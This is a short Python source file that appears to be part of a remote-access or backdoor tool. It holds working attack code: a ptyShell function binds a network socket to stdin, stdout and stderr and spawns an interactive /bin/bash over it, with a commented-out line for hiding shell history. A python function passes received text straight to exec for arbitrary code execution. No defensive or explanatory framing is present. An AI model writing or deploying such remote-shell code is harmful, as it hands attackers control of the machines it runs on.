#!/usr/bin/env python
import sys
import os
import pty

class Client(object):
    def __init__(self, conn, addr, IV=0, uid=0):
        self.conn   = conn
        self.addr   = addr
        self.uid    = uid


# a function that does nothing
# here for development
def nothing(*args):
    return "nothing() called! Not yet implemented."

# determine system platform 
def detectPlat():
    plat = sys.platform

    if plat.startswith('win'):      return 'win'
    elif plat.startswith('linux'):  return 'nix'
    elif plat.startswith('darwin'): return 'mac'
    return 'unk'

def ptyShell(action, sock):
    # #platformshells = {
    #     'win': 'cmd.exe',
    #     'mac': '/bin/bash',
    #     'nix': '/bin/bash',
    #     'unk': ''
    # }
    # shellExe = platformshells[plat]
    shellExe = '/bin/bash'

    #preparing
    oldin = os.dup(0)
    oldout = os.dup(1)
    olderr = os.dup(2)
    os.dup2(sock.fileno(),0)
    os.dup2(sock.fileno(),1)
    os.dup2(sock.fileno(),2)
    #os.putenv("HISTFILE",'/dev/null')

    #Shellz!
    pty.spawn(shellExe)

    # cleanup
    os.dup2(oldin,0)
    os.dup2(oldout,1)
    os.dup2(olderr,2)

def python(action):
    exec(action)